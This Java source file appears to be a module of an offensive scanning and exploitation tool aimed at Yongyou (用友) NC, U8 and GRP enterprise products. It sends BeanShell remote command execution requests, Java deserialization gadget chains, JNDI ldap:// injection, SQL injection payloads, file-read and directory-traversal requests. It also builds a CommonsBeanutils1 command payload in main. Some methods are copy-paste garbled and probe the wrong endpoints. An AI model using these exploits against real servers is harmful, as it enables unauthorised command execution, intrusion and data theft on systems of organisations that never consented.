package com.achuna33.Controllers;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.net.MalformedURLException;
import java.rmi.server.ExportException;

import com.achuna33.Gadgets.URLDNS;
import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.UI.UIController;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.DNSLOG;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.alibaba.fastjson.JSON;
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.cli.JavaURLCommunicator;
import org.springframework.http.converter.feed.RssChannelHttpMessageConverter;

import javax.naming.InitialContext;
import javax.naming.NamingException;


@BasicMapping(uri = "用友")
public class YongyouController extends Controller implements BasicController{
    public YongyouController(){

    }

    @VulnerabilityDescriptionMapping(Description="servlet/~ic/bsh.servlet.BshServlet 可以执行脚本。" ,SupportVulType= SupportVul.RuntimeExec)
    public void vul_Beanshell(Poc_Exp type,String target,Object... args) throws Exception {
        Cache.uiController.logTextArea.appendText("\n[*]开始检测：  vul_Beanshell");

        switch (type){
            case EXP:


                break;
            case POC:
               HttpRequest httpRequest = new HttpRequest(target+"/servlet/~ic/bsh.servlet.BshServlet");
                Response result = httpRequest.Post("bsh.script=exec(\"ipconfig\");");
                if(result.responseBody.contains("DNS")){
                    WriteLog("[*] 存在漏洞");
                }else {
                    WriteLog("[*] 不存在漏洞");
                }
                WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Serial)
    public void vul_ResourceManagerServlet(Poc_Exp type,String target,Object... args) throws Exception {

        Cache.uiController.logTextArea.appendText("\n开始检测：vul_ResourceManagerServlet");
        switch (type){
            case EXP:
                String text = "";
                if (args!=null){
                    text = (String) args[0];
                    SerializedDataController serializedDataController = new SerializedDataController();
                    serializedDataController.process(text);
                    byte[] obj = serializedDataController.getResult(text);

                    target = target+"/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet";
                    HttpRequest httpRequest = new HttpRequest(target);
                    httpRequest.addHeaders("Content-Type","");
                    httpRequest.Post(obj);
                    WriteExpLog("\n[*] 发送成功。");

                }else {
                    WriteExpLog("\n[*] 请输入利用链");
                    return;
                }
                break;
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();
                Object object = URLDNS.getObject("http://"+domain);

                target = target+"/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet";
                HttpRequest httpRequest = new HttpRequest(target);
                httpRequest.addHeaders("Content-Type","");
                httpRequest.Post(object);

                WriteLog("请自行判断是否成功。"+domain);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Serial)
    public void vul_XbrlPersistenceServlet(Poc_Exp type,String target,Object... args) throws Exception {
        Cache.uiController.logTextArea.appendText("\n开始检测：  vul_ResourceManagerServlet");
        switch (type){
            case EXP:
                String text = "";
                if (args!=null){
                    text = (String) args[0];
                    SerializedDataController serializedDataController = new SerializedDataController();
                    serializedDataController.process(text);
                    byte[] obj = serializedDataController.getResult(text);

                    target = target+"/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet";
                    HttpRequest httpRequest = new HttpRequest(target);
                    httpRequest.addHeaders("Content-Type","");
                    httpRequest.Post(obj);
                    WriteExpLog("\n[*] 发送成功。");

                }else {
                    WriteExpLog("\n[*] 请输入利用链");
                    return;
                }
                break;
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("[*]DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();
                Object object = URLDNS.getObject("http://"+domain);

                target = target + "/service/~xbrl/XbrlPersistenceServlet";
                HttpRequest httpRequest = new HttpRequest(target);
                httpRequest.addHeaders("Content-Type","");
                httpRequest.Post(object);

                WriteLog("[*]请自行判断是否成功。"+domain);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Jndi)
    public void vul_LoginJndi(Poc_Exp type,String target,Object... args){
        Cache.uiController.logTextArea.appendText("\n开始检测： vul_LoginJndi POC需要配置DNS");
        switch (type) {
            case EXP:
                try {
                    WriteExpLog ("\n开始检测： vul_LoginJndi EXP");
                    WriteExpLog ("\nDemo： ldap://127.0.0.1/");
                    InvocationInfo info = new InvocationInfo();
                    info.setServiceName((String) args[0]);
                    JavaURLCommunicator com = new JavaURLCommunicator();
                    target = target + "/ServiceDispatcherServlet";

                    com.request(info,target);
                }catch (Exception e){
                    WriteExpLog("\n[*] 请自行判断是否成功。"+DNSLOG.domain);
                }
                break;
            case POC:
                try {
                    if (Cache.uiController.DNSDomain.getText().equals("")){
                        WriteLog("[*]  DNS验证类型漏洞 请配置 DNSLOG 地址");
                        return;
                    }else {
                        DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                    }
                    InvocationInfo info = new InvocationInfo();

                    String domain = DNSLOG.getRandomDomain();
                    info.setServiceName("ldap://"+domain);
                    JavaURLCommunicator com = new JavaURLCommunicator();
                    target = target + "/ServiceDispatcherServlet";

                    com.request(info,target);
                }catch (Exception e){
                    WriteLog("[*]请自行判断是否成功。"+DNSLOG.domain);
                }
        }

    }
    @VulnerabilityDescriptionMapping(Description="用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞",SupportVulType= SupportVul.信息泄露)
    public void vul_getSessionList(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞");


        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll");
                Response result = httpRequest.Get("");
                if(result.statusCode==200){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n请求地址："+target+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll");
                }else {
                    WriteLog("\n 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description="用友 U8 OA test.jsp SQL注入漏洞",SupportVulType= SupportVul.SQLInjection)
    public void vul_testSqlInjection(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  用友 U8 OA test.jsp SQL注入漏洞");


        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("MD5")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n请求地址："+target+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))");
                }else {
                    WriteLog("\n 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description="用友 NC NCFindWeb 任意文件读取漏洞",SupportVulType= SupportVul.SQLInjection)
    public void vul_NCFindWeb(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  用友 NC NCFindWeb 任意文件读取漏洞");


        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("WebApp")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n请求地址："+target+"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml");
                }else {
                    WriteLog("\n 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description="用友 NC bsh.servlet.BshServlet 远程命令执行漏洞",SupportVulType= SupportVul.RuntimeExec)
    public void vul_BshServlet(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n开始检测：  用友 NC bsh.servlet.BshServlet 远程命令执行漏洞");


        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/servlet/~ic/bsh.servlet.BshServlet");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("BeanShell")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n请求地址："+target+"/servlet/~ic/bsh.servlet.BshServlet");
                }else {
                    WriteLog("\n 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description="用友 NCCloud FS文件管理SQL注入",SupportVulType= SupportVul.RuntimeExec)
    public void vul_FS文件管理SQL注入(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n[*]开始检测：  用友 NCCloud FS文件管理SQL注入");


        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/servlet/~ic/bsh.servlet.BshServlet");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("BeanShell")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/servlet/~ic/bsh.servlet.BshServlet");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description="用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞",SupportVulType= SupportVul.信息泄露)
    public void vul_templateOfTaohong_manager(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n[*]开始检测：  用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞");
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../");
                Response result = httpRequest.Get("");
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/servlet/~ic/bsh.servlet.BshServlet");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description="用友 GRP-U8 Proxy SQL注入 CNNVD-201610-923",SupportVulType= SupportVul.信息泄露)
    public void vul_Proxy(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        Cache.uiController.logTextArea.appendText("\n[*]开始检测：  用友 GRP-U8 Proxy SQL注入 CNNVD-201610-923");
        String payload = "cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format=\"text\">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>\n";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/Proxy");
                Response result = httpRequest.Post(payload);
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/Proxy");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    public static void main(String[] args) throws Exception {
        //new InitialContext().lookup("ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/Command/Base64/Q2FsYw==");
        String text = "Deserialization/CommonsBeanutils1/Command/Base64/Q2FsYw==";
        SerializedDataController serializedDataController = new SerializedDataController();
        serializedDataController.process(text);
        byte[] bytes = serializedDataController.getResult(text);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream obj = new ObjectInputStream(byteArrayInputStream);
        obj.readObject();
    }
}
